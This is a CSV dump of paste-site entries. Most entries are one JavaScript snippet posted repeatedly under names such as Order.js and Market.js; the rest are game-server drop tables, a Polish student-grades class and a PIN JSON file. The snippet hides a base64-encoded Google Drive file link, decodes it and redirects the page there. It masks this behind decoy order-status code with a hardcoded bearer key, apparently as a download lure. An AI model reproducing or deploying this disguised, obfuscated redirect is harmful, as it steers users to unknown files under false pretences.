id,title,username,language,date,content
gZpi61gQ,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 02:52:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34164/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zxPApxP2,Products.js,kammex,JavaScript,Sunday 13th of April 2025 02:36:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37040/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sVXrtJHE,l2jsquad extractable new boxs,Reanimation06,Java,Sunday 13th of April 2025 02:29:40 AM CDT,"scripts\handler\items\Extractable.java
------------------------------------------------------------------------------ 

	private static final int[] ITEM_IDS = new int[]{8534,
			8535,

			59932,
			59933,
			59934,
			59935,
			59936,

------------------------------------------------------------------------------

			case 59932:
				use59932(player, ctrl);
				break;
			case 59933:
				use59933(player, ctrl);
				break;
			case 59934:
				use59934(player, ctrl);
				break;
			case 59935:
				use59935(player, ctrl);
				break;
			case 59936:
				use59936(player, ctrl);
				break;


------------------------------------------------------------------------------



		// Daily Gift Box
	private void use59932(Player player, boolean ctrl)
		{  
	        int items[][] = new int[][] 
	          { 
	           // itemId, min, max 
	    			  {57, 10000000, 20000000}, 
	    			  {952, 1, 2}, 
	    			  {951, 1, 2}, 
	    			  {948, 1, 2}, 
	    			  {947, 1, 2}, 
	    			  {730, 1, 2}, 
	    			  {729, 1, 2}, 
	    			  {960, 1, 2}, 
	    			  {956, 1, 2}, 
	    			  {6574, 1, 2}, 
	    			  {6573, 1, 2}, 
	    			  {6572, 1, 2}, 
	    			  {6571, 1, 2}, 
	    			  {6570, 1, 2}, 
	    			  {6569, 1, 2}, 
	    			  {6578, 1, 2}, 
	    			  {6577, 1, 2}, 
	    			  {22016, 1, 1}, 
	    			  {22014, 1, 1}, 
	    			  {22017, 1, 1}, 
	    			  {22014, 1, 1}, 
	    			  {20520, 1, 1}, 
	    			  {20519, 1, 1}, 
	    			  {14008, 1, 1}, 
	    			  {14169, 5, 10}, 
	    			  {6622, 2, 5}, 
	    			  {9625, 1, 5}, 
	    			  {9626, 1, 5}, 
	    			  {9627, 1, 5}, 
	    			  {9546, 2, 10}, 
	    			  {9547, 2, 10}, 
	    			  {9548, 2, 10}, 
	    			  {9549, 2, 10}, 
	    			  {9550, 2, 10}, 
	    			  {9551, 2, 10}, 
	    			  {9552, 1, 5}, 
	    			  {9553, 1, 5}, 
	    			  {9554, 1, 5}, 
	    			  {9555, 1, 5}, 
	    			  {9556, 1, 5}, 
	    			  {9557, 1, 5}, 
	    			  {5990, 5, 10}, 
	    			  {37007, 5, 10}, 
	    			  {6392, 1000, 5000}, 
	    			  {59931, 10, 20}
	          };

	          double chances[] = new double[] 
	          { 
	           // chance 
	        		  100.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  03.00,
	        		  04.00,
	        		  03.00,
	        		  04.00,
	        		  03.00,
	        		  04.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00
	          }; 

	       capsulate(player, items, chances); 
	    }
		// Special Gift Box
	private void use59933(Player player, boolean ctrl)
		{  
	        int items[][] = new int[][] 
	          { 
	           // itemId, min, max 
	    			  {6574, 1, 2}, 
	    			  {6573, 1, 2}, 
	    			  {6572, 1, 2}, 
	    			  {6571, 1, 2}, 
	    			  {6570, 1, 2}, 
	    			  {6569, 1, 2}, 
	    			  {6578, 1, 2}, 
	    			  {6577, 1, 2}, 
	    			  {22016, 1, 2}, 
	    			  {22014, 1, 2}, 
	    			  {22017, 1, 2}, 
	    			  {22015, 1, 2}, 
	    			  {20520, 1, 2}, 
	    			  {20519, 1, 2}, 
	    			  {22020, 1, 1}, 
	    			  {22018, 1, 1}, 
	    			  {22021, 1, 1}, 
	    			  {22019, 1, 1}, 
	    			  {20522, 1, 1}, 
	    			  {20521, 1, 1}, 
	    			  {20204, 1, 1}, 
	    			  {20207, 1, 1}, 
	    			  {22304, 1, 1}, 
	    			  {22302, 1, 1}, 
	    			  {14008, 1, 1}, 
	    			  {14169, 5, 10}, 
	    			  {6622, 2, 5}, 
	    			  {9625, 1, 5}, 
	    			  {9626, 1, 5}, 
	    			  {9627, 1, 5}, 
	    			  {9546, 2, 10}, 
	    			  {9547, 2, 10}, 
	    			  {9548, 2, 10}, 
	    			  {9549, 2, 10}, 
	    			  {9550, 2, 10}, 
	    			  {9551, 2, 10}, 
	    			  {9552, 1, 5}, 
	    			  {9553, 1, 5}, 
	    			  {9554, 1, 5}, 
	    			  {9555, 1, 5}, 
	    			  {9556, 1, 5}, 
	    			  {9557, 1, 5}, 
	    			  {5990, 5, 10}, 
	    			  {37007, 5, 10}, 
	    			  {6392, 1000, 5000}, 
	    			  {59931, 10, 20}
	          };

	          double chances[] = new double[] 
	          { 
	           // chance 
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  04.00,
	        		  03.00,
	        		  04.00,
	        		  03.00,
	        		  04.00,
	        		  03.00,
	        		  01.00,
	        		  01.00,
	        		  01.00,
	        		  01.00,					  
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00
	          }; 

	       capsulate(player, items, chances); 
	    }
		// Vote Gift Box
	private void use59934(Player player, boolean ctrl)
		{  
	        int items[][] = new int[][] 
	          { 
	           // itemId, min, max 
	    			  {37007, 10, 20}, 
	    			  {40000, 1, 1}, 
	    			  {21580, 1, 1}, 
	    			  {21582, 1, 2}, 
	    			  {9570, 1, 1}, 
	    			  {9571, 1, 1}, 
	    			  {9572, 1, 1}, 
	    			  {10480, 1, 1}, 
	    			  {10481, 1, 1}, 
	    			  {10482, 1, 1}, 
	    			  {13071, 1, 1}, 
	    			  {13072, 1, 1}, 
	    			  {13073, 1, 1}, 
	    			  {15541, 1, 1}, 
	    			  {15542, 1, 1}, 
	    			  {15543, 1, 1}, 
	    			  {15826, 1, 1}, 
	    			  {15827, 1, 1}, 
	    			  {15828, 1, 1}, 
	    			  {14008, 1, 1}, 
	    			  {14169, 5, 10}, 
	    			  {6622, 2, 5}, 
	    			  {9625, 1, 5}, 
	    			  {9626, 1, 5}, 
	    			  {9627, 1, 5}, 
	    			  {9546, 2, 10}, 
	    			  {9547, 2, 10}, 
	    			  {9548, 2, 10}, 
	    			  {9549, 2, 10}, 
	    			  {9550, 2, 10}, 
	    			  {9551, 2, 10}, 
	    			  {9552, 1, 5}, 
	    			  {9553, 1, 5}, 
	    			  {9554, 1, 5}, 
	    			  {9555, 1, 5}, 
	    			  {9556, 1, 5}, 
	    			  {9557, 1, 5}, 
	    			  {59931, 10, 20}
	          };

	          double chances[] = new double[] 
	          { 
	           // chance 
	        		  100.00,
	        		  100.00,
	        		  02.00,
	        		  02.00,
	        		  20.00,
	        		  20.00,
	        		  20.00,
	        		  15.00,
	        		  15.00,
	        		  15.00,
	        		  10.00,
	        		  10.00,
	        		  10.00,
	        		  05.00,
	        		  05.00,
	        		  05.00,
	        		  01.00,
	        		  01.00,
	        		  01.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  34.00
	          }; 

	       capsulate(player, items, chances); 
	    }
		// Event Gift Box
	private void use59935(Player player, boolean ctrl)
		{  
	        int items[][] = new int[][] 
	          { 
	           // itemId, min, max 
	    			  {5990, 10, 20}, 
	    			  {59811, 1, 1}, 
	    			  {59812, 1, 1}, 
	    			  {67022, 1, 2}, 
	    			  {9570, 1, 1}, 
	    			  {9571, 1, 1}, 
	    			  {9572, 1, 1}, 
	    			  {10480, 1, 1}, 
	    			  {10481, 1, 1}, 
	    			  {10482, 1, 1}, 
	    			  {13071, 1, 1}, 
	    			  {13072, 1, 1}, 
	    			  {13073, 1, 1}, 
	    			  {15541, 1, 1}, 
	    			  {15542, 1, 1}, 
	    			  {15543, 1, 1}, 
	    			  {15826, 1, 1}, 
	    			  {15827, 1, 1}, 
	    			  {15828, 1, 1}, 
	    			  {14008, 1, 1}, 
	    			  {14169, 5, 10}, 
	    			  {6622, 2, 5}, 
	    			  {9625, 1, 5}, 
	    			  {9626, 1, 5}, 
	    			  {9627, 1, 5}, 
	    			  {9546, 2, 10}, 
	    			  {9547, 2, 10}, 
	    			  {9548, 2, 10}, 
	    			  {9549, 2, 10}, 
	    			  {9550, 2, 10}, 
	    			  {9551, 2, 10}, 
	    			  {9552, 1, 5}, 
	    			  {9553, 1, 5}, 
	    			  {9554, 1, 5}, 
	    			  {9555, 1, 5}, 
	    			  {9556, 1, 5}, 
	    			  {9557, 1, 5}, 
	    			  {59931, 10, 20}
	          };

	          double chances[] = new double[] 
	          { 
	           // chance 
	        		  100.00,
	        		  02.00,
	        		  02.00,
	        		  02.00,
	        		  20.00,
	        		  20.00,
	        		  20.00,
	        		  15.00,
	        		  15.00,
	        		  15.00,
	        		  10.00,
	        		  10.00,
	        		  10.00,
	        		  05.00,
	        		  05.00,
	        		  05.00,
	        		  01.00,
	        		  01.00,
	        		  01.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  34.00
	          }; 

	       capsulate(player, items, chances); 
	    }
		// Farm Gift Box
	private void use59936(Player player, boolean ctrl)
		{  
	        int items[][] = new int[][] 
	          { 
	           // itemId, min, max 
	    			  {6574, 1, 2}, 
	    			  {6573, 1, 2}, 
	    			  {6572, 1, 2}, 
	    			  {6571, 1, 2}, 
	    			  {6570, 1, 2}, 
	    			  {6569, 1, 2}, 
	    			  {6578, 1, 2}, 
	    			  {6577, 1, 2}, 
	    			  {22016, 1, 1}, 
	    			  {22014, 1, 1}, 
	    			  {22017, 1, 1}, 
	    			  {22014, 1, 1}, 
	    			  {20520, 1, 1}, 
	    			  {20519, 1, 1},			   
	    			  {9570, 1, 1}, 
	    			  {9571, 1, 1}, 
	    			  {9572, 1, 1}, 
	    			  {10480, 1, 1}, 
	    			  {10481, 1, 1}, 
	    			  {10482, 1, 1}, 
	    			  {13071, 1, 1}, 
	    			  {13072, 1, 1}, 
	    			  {13073, 1, 1}, 
	    			  {15541, 1, 1}, 
	    			  {15542, 1, 1}, 
	    			  {15543, 1, 1}, 
	    			  {15826, 1, 1}, 
	    			  {15827, 1, 1}, 
	    			  {15828, 1, 1}, 
	    			  {14008, 1, 1}, 
	    			  {14169, 5, 10}, 
	    			  {6622, 2, 5}, 
	    			  {9625, 1, 5}, 
	    			  {9626, 1, 5}, 
	    			  {9627, 1, 5}, 
	    			  {9546, 2, 10}, 
	    			  {9547, 2, 10}, 
	    			  {9548, 2, 10}, 
	    			  {9549, 2, 10}, 
	    			  {9550, 2, 10}, 
	    			  {9551, 2, 10}, 
	    			  {9552, 1, 5}, 
	    			  {9553, 1, 5}, 
	    			  {9554, 1, 5}, 
	    			  {9555, 1, 5}, 
	    			  {9556, 1, 5}, 
	    			  {9557, 1, 5}, 
	    			  {59931, 10, 20}
	          };

	          double chances[] = new double[] 
	          { 
	           // chance
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  03.00,
	        		  04.00,
	        		  03.00,
	        		  04.00,
	        		  03.00,
	        		  04.00,			   
	        		  20.00,
	        		  20.00,
	        		  20.00,
	        		  15.00,
	        		  15.00,
	        		  15.00,
	        		  10.00,
	        		  10.00,
	        		  10.00,
	        		  05.00,
	        		  05.00,
	        		  05.00,
	        		  01.00,
	        		  01.00,
	        		  01.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  33.00,
	        		  34.00,
	        		  34.00
	          }; 

	       capsulate(player, items, chances); 
	    }"
Saxe4rFF,Order.js,kammex,JavaScript,Sunday 13th of April 2025 02:21:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11671/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rQaLGrG1,Pin Dialog Prime Video,Rakibmunshi721,JSON,Sunday 13th of April 2025 02:16:06 AM CDT,"{
  ""ModsLabs_Password"": [
    {
      ""password"": ""1234""
    }
  ]
}"
EGrFzL4h,Market.js,kammex,JavaScript,Sunday 13th of April 2025 02:05:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92653/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
M1b6qXS6,Untitled,kammex,JavaScript,Sunday 13th of April 2025 01:50:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33491/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZwPJr2Q4,Untitled,adrianwii,Python,Sunday 13th of April 2025 01:46:36 AM CDT,"class Uczen:
    def __init__(self, name):
        self.name = name
        self.oceny = []

    def dodaj_ocene(self, ocena):
        self.oceny.append(ocena)

    def policz_srednia(self):
        suma = 0
        for ocena in self.oceny:
            suma += ocena

        return suma/len(self.oceny)


from uczen import Uczen

uczen = Uczen(""Adrian"")
print(uczen.name)


uczen.dodaj_ocene(5)
uczen.dodaj_ocene(1)
uczen.dodaj_ocene(3)

print(uczen.oceny)
print(uczen.policz_srednia())
"
qen1innh,Products.js,kammex,JavaScript,Sunday 13th of April 2025 01:35:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69511/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sVFweVic,Order.js,kammex,JavaScript,Sunday 13th of April 2025 01:19:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/30952/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
07g382Ep,Market.js,kammex,JavaScript,Sunday 13th of April 2025 01:03:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/61996/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
